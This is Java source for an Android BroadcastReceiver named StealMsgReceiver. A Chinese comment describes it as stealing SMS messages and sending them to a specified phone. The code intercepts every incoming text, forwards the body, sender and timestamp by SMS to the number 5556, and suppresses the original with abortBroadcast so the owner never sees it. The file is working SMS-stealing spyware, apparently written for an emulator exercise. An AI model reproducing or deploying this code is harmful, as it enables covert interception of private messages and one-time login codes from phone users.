package com.sxt.msg;

import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
/**
 * 短信的窃取 并发送到指定手机上
 *
 */
public class StealMsgReceiver extends BroadcastReceiver{

	@Override
	public void onReceive(Context arg0, Intent intent) {
		System.out.println("------------onReceive---------");
		//获取短消息数据
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for(Object p : pdus){
			byte[] pdu = (byte[]) p;
			SmsMessage message = SmsMessage.createFromPdu(pdu);
			String content = message.getMessageBody();
			Date date = new Date(message.getTimestampMillis());
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String receiveTime = format.format(date);
			String senderNumber = message.getOriginatingAddress();
			
			//发送短信
			sendSMS(content, receiveTime, senderNumber);
			
			//如果是5556发来的短信 屏蔽掉
//			if("5556".equals(senderNumber)){
				abortBroadcast();//终止广播
//			}
		}
	}
	
	/**
	 * 发送短信
	 */
	private boolean sendSMS(String content, String receiveTime, String senderNumber) {
		try{
			String params = "content="+ URLEncoder.encode(content, "UTF-8")+
				"&receivetime="+ receiveTime+ "&sendernumber="+ senderNumber;
			System.out.println("=============="+params);

			//自动把拦截的短信转发给5556
			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("5556", null, params, null, null);
		}catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}
}
